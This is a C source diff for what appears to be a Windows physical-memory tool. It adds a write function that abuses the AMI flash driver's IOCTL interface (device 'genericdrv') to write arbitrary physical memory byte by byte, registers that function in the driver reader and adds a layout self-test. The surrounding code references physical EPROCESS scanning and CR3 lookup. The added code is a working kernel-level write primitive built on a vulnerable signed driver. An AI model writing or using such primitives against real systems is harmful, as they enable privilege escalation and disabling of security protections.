@@ -647,6 +647,28 @@ static int read_amifldrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t siz
     return 1;
 }
 
+static int amifldrv_build_write_request(uint64_t pa, uint32_t value, uint32_t width, uint8_t out[0x10]) {
+    if (!out) return 0;
+    memset(out, 0, 0x10);
+    *(uint64_t *)(out + 0x00) = pa;
+    *(uint32_t *)(out + 0x04) = 0;
+    *(uint32_t *)(out + 0x08) = width;
+    *(uint32_t *)(out + 0x0c) = value;
+    return 1;
+}
+
+static int write_amifldrv(mb_phys_reader *r, uint64_t pa, const void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    const uint8_t *inb = (const uint8_t *)buf;
+    for (uint32_t i = 0; i < size; i++) {
+        uint8_t in[0x10];
+        DWORD ret = 0;
+        if (!amifldrv_build_write_request(pa + i, inb[i], 0, in)) return 0;
+        if (!DeviceIoControl(r->dev, 0xFA002EF0u, in, sizeof(in), NULL, 0, &ret, NULL)) return 0;
+    }
+    return 1;
+}
+
 static int read_winio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
     uint8_t req[0x28];
     DWORD ret = 0;
@@ -886,6 +908,7 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
         r->name = "amifldrv";
         r->mode = 18;
         r->read = read_amifldrv;
+        r->write = write_amifldrv;
         r->dev = CreateFileA(device ? device : "\\\\.\\genericdrv",
                              GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 0, NULL);
@@ -1701,6 +1724,14 @@ static int selftest_mock(void) {
                  *(uint64_t *)(amireq + 0x00) == 0x12345678ull &&
                  *(uint32_t *)(amireq + 0x08) == 0;
     check("取数层(fetcher)", "amifldrv read request layout (PA/width)", ok_ami);
+
+    // AMI flash driver write request layout (offline, no driver)
+    uint8_t amiw[0x10];
+    int ok_amiw = amifldrv_build_write_request(0x12345678, 0xAB, 0, amiw) &&
+                  *(uint64_t *)(amiw + 0x00) == 0x12345678ull &&
+                  *(uint32_t *)(amiw + 0x08) == 0 &&
+                  *(uint32_t *)(amiw + 0x0c) == 0xAB;
+    check("取数层(fetcher)", "amifldrv write request layout (PA/value)", ok_amiw);
 
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
